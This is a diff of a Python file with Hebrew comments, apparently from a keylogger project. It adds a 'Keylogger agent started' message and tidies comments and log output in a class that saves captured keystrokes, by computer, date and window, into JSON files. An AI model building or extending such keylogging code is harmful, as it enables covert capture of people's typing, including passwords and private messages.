@@ -10,6 +10,7 @@ import json
 import socket
 from datetime import datetime
 
+print("Keylogger agent started.")
 def get_source_computer_name():
     """מחזיר את שם המחשב שממנו מגיעות ההקשות"""
     return socket.gethostname()
@@ -82,25 +83,25 @@ class JsonFileManager:
             time_str = entry["timestamp"]  # תאריך מלא YYYY-MM-DD HH:MM
             window_name = entry["window"]  # שם החלון
 
-            # 1️⃣ יצירת תיקיות
+            #  יצירת תיקיות
             computer_dir = os.path.join(self.base_path, computer_name)
             self.ensure_directory_exists(computer_dir)
 
             date_dir = os.path.join(computer_dir, date_str)
             self.ensure_directory_exists(date_dir)
 
-            # 2️⃣ קובץ JSON יומי יחיד
+            #  קובץ JSON יומי יחיד
             json_filename = "log.json"
             json_path = os.path.join(date_dir, json_filename)
 
-            # 3️⃣ טעינת נתונים קיימים
+            #  טעינת נתונים קיימים
             if os.path.exists(json_path):
                 with open(json_path, 'r', encoding='utf-8') as f:
                     existing_data = json.load(f)
             else:
                 existing_data = {"source_computer": computer_name, "date": date_str, "entries": []}
 
-            # 4️⃣ חיפוש רשומה קיימת עם אותו timestamp ואותו window
+            #  חיפוש רשומה קיימת עם אותו timestamp ואותו window
             found = False
             for entry_data in existing_data["entries"]:
                 if entry_data["timestamp"] == time_str and entry_data["window"] == window_name:
@@ -108,7 +109,7 @@ class JsonFileManager:
                     found = True
                     break
 
-            # 5️⃣ אם לא נמצאה רשומה, יוצרים רשומה חדשה
+            #  אם לא נמצאה רשומה, יוצרים רשומה חדשה
             if not found:
                 existing_data["entries"].append({
                     "timestamp": time_str,
@@ -116,11 +117,11 @@ class JsonFileManager:
                     "keys": entry["keys"]
                 })
 
-            # 6️⃣ שמירת הנתונים חזרה לקובץ
+            # 6️ שמירת הנתונים חזרה לקובץ
             with open(json_path, 'w', encoding='utf-8') as f:
                 json.dump(existing_data, f, ensure_ascii=False, indent=2)
 
-            print(f"[INFO] עדכון נתונים: {json_path}")  # לוודא שזה עובד
+            print(f"Update {json_path}")  # לוודא שזה עובד
 
 
 class Encryptor:
